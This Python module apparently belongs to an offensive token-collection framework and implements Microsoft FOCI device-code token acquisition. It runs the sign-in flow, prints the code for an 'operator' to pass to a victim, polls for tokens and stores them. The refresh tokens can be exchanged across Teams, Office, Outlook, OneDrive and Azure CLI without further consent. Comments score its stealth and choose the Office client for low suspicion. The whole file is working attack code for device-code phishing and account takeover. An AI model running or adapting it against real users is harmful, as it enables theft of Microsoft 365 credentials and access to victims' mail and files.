"""Microsoft FOCI device code flow collector — stdlib-only, no msal dependency.

Uses Microsoft's Family of Client IDs (FOCI) mechanism to acquire tokens via
the OAuth 2.0 device authorization grant (RFC 8628). A refresh token obtained
from ANY FOCI client can be silently exchanged for access tokens to ALL other
FOCI clients without additional user interaction. This means a single device
code approval can unlock Teams, Office, Outlook, OneDrive, and Azure CLI.

FOCI client IDs (first-party Microsoft apps, no client_secret required):
  - Microsoft Teams:    1fec8e78-bce4-4aaf-ab1b-5451cc387264
  - Microsoft Office:   d3590ed6-52b3-4102-aeff-aad2292ab01c
  - Outlook Mobile:     27922004-5251-4030-b22d-91ecd9a37ea4
  - OneDrive:           ab9b8c07-8f02-4f72-87fa-80105867a763
  - Azure CLI:          04b07795-8ddb-461a-bbee-02f9e1bf7b46

Post-collection, the operator can exchange the refresh_token for tokens from
other FOCI apps by calling the /token endpoint with a different client_id and
the same refresh_token. No additional consent is needed.

This collector uses urllib only — no msal or requests dependency.
"""

from __future__ import annotations

import base64
import json
import sys
import time
import urllib.error
import urllib.parse
import urllib.request
from typing import Dict, List, Optional

from ..base import BaseCollector
from .. import CollectorRegistry
from ...types import CollectedToken, DiscoveredToken, RefreshResult
from ...secure import secure


# FOCI (Family of Client IDs) — first-party Microsoft apps, no client_secret needed.
# A refresh token from any FOCI app can be exchanged for tokens to ANY other FOCI app.
FOCI_CLIENTS: Dict[str, str] = {
    "teams": "1fec8e78-bce4-4aaf-ab1b-5451cc387264",
    "office": "d3590ed6-52b3-4102-aeff-aad2292ab01c",
    "outlook_mobile": "27922004-5251-4030-b22d-91ecd9a37ea4",
    "onedrive": "ab9b8c07-8f02-4f72-87fa-80105867a763",
    "azure_cli": "04b07795-8ddb-461a-bbee-02f9e1bf7b46",
}

# Default client: Microsoft Office — broad scope access, low suspicion
DEFAULT_CLIENT_ID = FOCI_CLIENTS["office"]
DEFAULT_SCOPES = "offline_access openid profile User.Read Mail.Read Files.Read.All"

DEVICE_CODE_URL = "https://login.microsoftonline.com/common/oauth2/v2.0/devicecode"
TOKEN_URL = "https://login.microsoftonline.com/common/oauth2/v2.0/token"


def _decode_jwt_claims(token: str) -> dict:
    """Decode the payload of a JWT without verification (base64url decode).

    We only need to extract claims (tid, oid, preferred_username, name) from
    the id_token. No signature verification — we trust the token endpoint.
    """
    try:
        parts = token.split(".")
        if len(parts) < 2:
            return {}
        # Base64url decode the payload (second segment)
        payload = parts[1]
        # Add padding if needed
        padding = 4 - len(payload) % 4
        if padding != 4:
            payload += "=" * padding
        decoded = base64.urlsafe_b64decode(payload)
        return json.loads(decoded)
    except Exception:
        return {}


def _post_form(url: str, data: dict, timeout: int = 30) -> dict:
    """POST application/x-www-form-urlencoded and return parsed JSON response."""
    encoded = urllib.parse.urlencode(data).encode("utf-8")
    req = urllib.request.Request(
        url,
        data=encoded,
        headers={"Content-Type": "application/x-www-form-urlencoded"},
        method="POST",
    )
    with urllib.request.urlopen(req, timeout=timeout) as resp:
        return json.loads(resp.read().decode("utf-8"))


@CollectorRegistry.register
class MicrosoftFociDeviceCodeCollector(BaseCollector):
    """FOCI device code flow — stdlib-only, interactive token acquisition.

    Initiates a device code flow using a FOCI client ID (default: Microsoft
    Office). The user authenticates in their browser, and the collector polls
    until approval. The resulting refresh_token can be exchanged across all
    FOCI client IDs without further consent.

    Stealth: 3 — generates an interactive sign-in event in Azure AD logs.
    """

    service = "microsoft"
    source = "foci_device_code"
    stealth_score = 3
    requires: List[str] = []  # stdlib only — no optional deps

    def discover(self) -> List[DiscoveredToken]:
        """Device code flow is always available — it's interactive."""
        return [DiscoveredToken(
            service=self.service,
            source=self.source,
            stealth_score=self.stealth_score,
            details="interactive FOCI device code flow (stdlib, no msal needed)",
        )]

    def collect(
        self,
        client_name: str = "office",
        scopes: Optional[str] = None,
        timeout_seconds: int = 900,
    ) -> List[CollectedToken]:
        """Run the device code flow and return the collected FOCI token.

        Args:
            client_name: FOCI client alias (teams, office, outlook_mobile,
                         onedrive, azure_cli) or a raw client_id UUID.
            scopes: Space-separated scope string. Defaults to
                    "offline_access openid profile User.Read Mail.Read Files.Read.All".
            timeout_seconds: Max seconds to wait for user to approve (default 900 = 15 min).
        """
        client_id = FOCI_CLIENTS.get(client_name, client_name)
        use_scopes = scopes or DEFAULT_SCOPES

        self._info(f"Starting FOCI device code flow (client={client_name}, scopes={use_scopes})")

        # ── Step 1: Initiate device code flow ──
        try:
            flow = _post_form(DEVICE_CODE_URL, {
                "client_id": client_id,
                "scope": use_scopes,
            })
        except urllib.error.HTTPError as e:
            body = e.read().decode("utf-8", errors="replace")
            self._warn(f"Failed to initiate device code flow: HTTP {e.code} — {body}")
            return []
        except Exception as e:
            self._warn(f"Failed to initiate device code flow: {e}")
            return []

        device_code = flow.get("device_code")
        user_code = flow.get("user_code")
        verification_uri = flow.get("verification_uri")
        interval = flow.get("interval", 5)
        expires_in = flow.get("expires_in", 900)

        if not device_code or not user_code:
            self._warn(f"Invalid device code response: {flow}")
            return []

        # ── Step 2: Display the code to the operator ──
        print(file=sys.stderr)
        print("=" * 60, file=sys.stderr)
        print("  MICROSOFT FOCI DEVICE CODE FLOW", file=sys.stderr)
        print("=" * 60, file=sys.stderr)
        print(f"  Visit:  {verification_uri}", file=sys.stderr)
        print(f"  Code:   {user_code}", file=sys.stderr)
        print(f"  Client: {client_name} ({client_id})", file=sys.stderr)
        print("=" * 60, file=sys.stderr)
        print(file=sys.stderr)
        self._info(f"Waiting for user to approve (timeout={min(timeout_seconds, expires_in)}s) ...")

        # ── Step 3: Poll the token endpoint ──
        effective_timeout = min(timeout_seconds, expires_in)
        deadline = time.monotonic() + effective_timeout

        while time.monotonic() < deadline:
            time.sleep(interval)

            try:
                result = _post_form(TOKEN_URL, {
                    "client_id": client_id,
                    "device_code": device_code,
                    "grant_type": "urn:ietf:params:oauth:grant-type:device_code",
                })
            except urllib.error.HTTPError as e:
                try:
                    error_body = json.loads(e.read().decode("utf-8", errors="replace"))
                except (json.JSONDecodeError, Exception):
                    error_body = {}

                error_code = error_body.get("error", "")

                if error_code == "authorization_pending":
                    # User hasn't approved yet — keep polling
                    continue
                elif error_code == "slow_down":
                    # Server asks us to increase the interval
                    interval += 5
                    continue
                elif error_code == "authorization_declined":
                    self._warn("User declined the device code authorization.")
                    return []
                elif error_code == "expired_token":
                    self._warn("Device code expired before user approved.")
                    return []
                else:
                    desc = error_body.get("error_description", f"HTTP {e.code}")
                    self._warn(f"Token polling error: {error_code} — {desc}")
                    return []
            except Exception as e:
                self._warn(f"Network error during polling: {e}")
                return []

            # ── Step 4: Token received! ──
            access_token = result.get("access_token")
            refresh_token_val = result.get("refresh_token")
            id_token = result.get("id_token", "")

            if not access_token:
                self._warn(f"Token response missing access_token: {list(result.keys())}")
                return []

            self._info("Device code approved — token acquired.")

            # ── Step 5: Extract claims from id_token ──
            claims = _decode_jwt_claims(id_token) if id_token else {}

            tenant_id = claims.get("tid", "common")
            scope_str = result.get("scope", use_scopes)
            token_scopes = scope_str.split() if isinstance(scope_str, str) else scope_str

            return [CollectedToken(
                service=self.service,
                source=self.source,
                stealth_score=self.stealth_score,
                account_id=claims.get("oid"),
                username=claims.get("preferred_username"),
                display_name=claims.get("name"),
                tenant_id=tenant_id,
                access_token=secure(access_token),
                refresh_token=secure(refresh_token_val) if refresh_token_val else None,
                client_id=client_id,
                token_uri=TOKEN_URL,
                scopes=token_scopes,
                foci=True,
                extra={
                    "client_name": client_name,
                    "token_type": result.get("token_type"),
                    "foci_clients": FOCI_CLIENTS,
                    "id_token_claims": {
                        k: claims[k] for k in ("oid", "tid", "preferred_username", "name", "upn")
                        if k in claims
                    },
                },
            )]

        # If we exit the loop, the deadline expired
        self._warn("Timed out waiting for device code approval.")
        return []

    def refresh(self, token: CollectedToken) -> RefreshResult:
        """Refresh a Microsoft FOCI token using stdlib urllib.

        Because this is a FOCI token, the refresh_token can be used with ANY
        FOCI client_id. By default we refresh with the same client_id that
        was used to collect the token.
        """
        if not token.refresh_token:
            return RefreshResult(
                success=False,
                service=self.service,
                source=self.source,
                error="No refresh token available",
            )

        client_id = token.client_id or DEFAULT_CLIENT_ID
        tenant_id = token.tenant_id or "common"
        token_url = token.token_uri or f"https://login.microsoftonline.com/{tenant_id}/oauth2/v2.0/token"

        try:
            result = _post_form(token_url, {
                "client_id": client_id,
                "refresh_token": token.refresh_token.value,
                "grant_type": "refresh_token",
                "scope": DEFAULT_SCOPES,
            })
        except urllib.error.HTTPError as e:
            try:
                error_body = json.loads(e.read().decode("utf-8", errors="replace"))
                desc = error_body.get("error_description", f"HTTP {e.code}")
            except Exception:
                desc = f"HTTP {e.code}"
            return RefreshResult(
                success=False,
                service=self.service,
                source=self.source,
                error=f"Refresh failed: {desc}",
            )
        except Exception as e:
            return RefreshResult(
                success=False,
                service=self.service,
                source=self.source,
                error=f"Refresh request failed: {e}",
            )

        if "access_token" not in result:
            return RefreshResult(
                success=False,
                service=self.service,
                source=self.source,
                error=result.get("error_description", "Refresh returned no access_token"),
            )

        id_token = result.get("id_token", "")
        claims = _decode_jwt_claims(id_token) if id_token else {}
        scope_str = result.get("scope", DEFAULT_SCOPES)
        token_scopes = scope_str.split() if isinstance(scope_str, str) else scope_str

        new_token = CollectedToken(
            service=self.service,
            source=self.source,
            stealth_score=self.stealth_score,
            account_id=claims.get("oid") or token.account_id,
            username=claims.get("preferred_username") or token.username,
            display_name=claims.get("name") or token.display_name,
            tenant_id=claims.get("tid") or tenant_id,
            access_token=secure(result["access_token"]),
            refresh_token=secure(result.get("refresh_token", token.refresh_token.value)),
            client_id=client_id,
            token_uri=token_url,
            scopes=token_scopes,
            foci=True,
            extra={
                "token_type": result.get("token_type"),
                "foci_clients": FOCI_CLIENTS,
            },
        )

        return RefreshResult(
            success=True,
            service=self.service,
            source=self.source,
            new_token=new_token,
        )
